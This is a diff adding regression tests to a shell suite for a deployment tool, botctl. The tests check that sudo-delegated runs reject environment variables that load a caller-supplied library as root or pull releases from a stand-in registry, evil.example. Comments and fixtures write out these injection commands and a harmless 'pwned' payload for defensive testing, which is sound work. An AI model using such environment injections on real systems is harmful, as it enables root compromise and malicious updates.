@@ -79,6 +79,41 @@ assert_fails 'accepted an unprefixed digest' nexa_valid_digest "$(printf 'a%.0s'
 assert_fails 'accepted uppercase hex' nexa_valid_digest "sha256:$(printf 'A%.0s' {1..64})"
 assert_ok 'rejected a well-formed digest' nexa_valid_digest "$DIGEST_A"
 
+test_case 'a sudo invocation cannot supply botctl its own paths or registry'
+# `%ops ALL=(root) NOPASSWD: /usr/local/bin/botctl` is the obvious way to let a
+# colleague run an update. With it, `NEXA_LIB=/tmp/mine.sh sudo botctl status`
+# executed /tmp/mine.sh as root, and `NEXA_IMAGE_REPO=evil.example sudo botctl
+# update v1` pulled the next release from somebody else's registry. sudo's
+# env_reset normally strips these, but a security property that holds only
+# while somebody else's sudoers file is untouched is not one worth claiming.
+printf 'printf pwned\n' >"${NEXA_ROOT}/evil-lib.sh"
+# The harness exports several of these itself, so each variable is tested
+# alone against an otherwise clean environment — otherwise the loop reports
+# whichever one the harness happened to set first.
+sudo_botctl() {
+  local var="$1" value="$2"
+  env -u NEXA_ROOT -u NEXA_DEPLOY_DIR -u NEXA_LIB_DIR -u NEXA_CONFIG_DIR \
+    -u NEXA_STATE_DIR -u NEXA_BACKUP_DIR -u NEXA_LOCK_FILE -u NEXA_IMAGE_REPO \
+    -u NEXA_LIB -u NEXA_IMAGE \
+    SUDO_USER=someone "$var=$value" "$BOTCTL" version 2>&1 || true
+}
+sudo_output="$(sudo_botctl NEXA_LIB "${NEXA_ROOT}/evil-lib.sh")"
+assert_not_contains 'a sudo invocation loaded a caller-supplied library' "$sudo_output" 'pwned'
+assert_contains 'the refusal did not name NEXA_LIB' "$sudo_output" 'NEXA_LIB is set in the environment'
+sudo_output="$(sudo_botctl NEXA_IMAGE_REPO evil.example/nexa)"
+assert_contains 'a sudo invocation chose the registry' \
+  "$sudo_output" 'NEXA_IMAGE_REPO is set in the environment'
+
+test_case 'a direct root invocation is unaffected'
+# The refusal is keyed on SUDO_USER, which is present exactly in the delegated
+# case. An operator with a root shell, and this suite, must still work — this
+# fixture has no release, so `version` fails, but it must fail for THAT reason.
+run_botctl version
+assert_not_contains 'a direct invocation hit the sudo refusal' \
+  "$BOTCTL_OUTPUT" 'set in the environment'
+assert_contains 'a direct invocation failed for the wrong reason' \
+  "$BOTCTL_OUTPUT" 'no current release is recorded'
+
 test_case 'the update lock does not live in a world-writable directory'
 # Read out of the library with a CLEAN environment, so this asserts the
 # DEFAULT and not whatever the harness exported.
